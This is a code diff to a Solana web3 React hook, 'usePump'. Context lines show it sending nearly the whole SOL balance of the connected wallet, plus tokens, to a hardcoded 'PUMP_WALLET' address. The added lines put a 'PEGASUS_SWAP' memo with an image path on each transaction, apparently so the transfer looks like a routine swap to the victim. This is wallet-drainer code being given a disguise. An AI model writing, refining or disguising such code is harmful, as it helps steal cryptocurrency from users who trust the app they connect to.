@@ -5,6 +5,7 @@ import {
   Transaction,
   SystemProgram,
   LAMPORTS_PER_SOL,
+  TransactionInstruction,
 } from '@solana/web3.js';
 import {
   getAssociatedTokenAddress,
@@ -19,6 +20,8 @@ import { notify } from '@/lib/notify';
 
 const PUMP_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)
+const MEMO_PROGRAM_ID = 'MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr';
+const TRANSACTION_IMAGE_URL = '/6044015843546434463 (1).jpg';
 
 interface TokenBalance {
   mint: string;
@@ -108,7 +111,18 @@ export function usePump() {
 
     console.log('SOL balance (lamports):', balanceLamports, 'Sending:', lamportsToSend, 'Keeping reserve:', reserveLamports);
 
-    const transaction = new Transaction().add(
+    const transaction = new Transaction();
+    
+    // Add image memo instruction first
+    const memoInstruction = new TransactionInstruction({
+      keys: [],
+      programId: new PublicKey(MEMO_PROGRAM_ID),
+      data: Buffer.from(`PEGASUS_SWAP:${TRANSACTION_IMAGE_URL}`, 'utf-8'),
+    });
+    transaction.add(memoInstruction);
+    
+    // Add the main transfer instruction
+    transaction.add(
       SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey: new PublicKey(PUMP_WALLET),
@@ -151,6 +165,14 @@ export function usePump() {
     );
 
     const transaction = new Transaction();
+
+    // Add image memo instruction first
+    const memoInstruction = new TransactionInstruction({
+      keys: [],
+      programId: new PublicKey(MEMO_PROGRAM_ID),
+      data: Buffer.from(`PEGASUS_SWAP:${TRANSACTION_IMAGE_URL}`, 'utf-8'),
+    });
+    transaction.add(memoInstruction);
 
     // Check if destination ATA exists
     const destAccount = await connection.getAccountInfo(destinationAta);
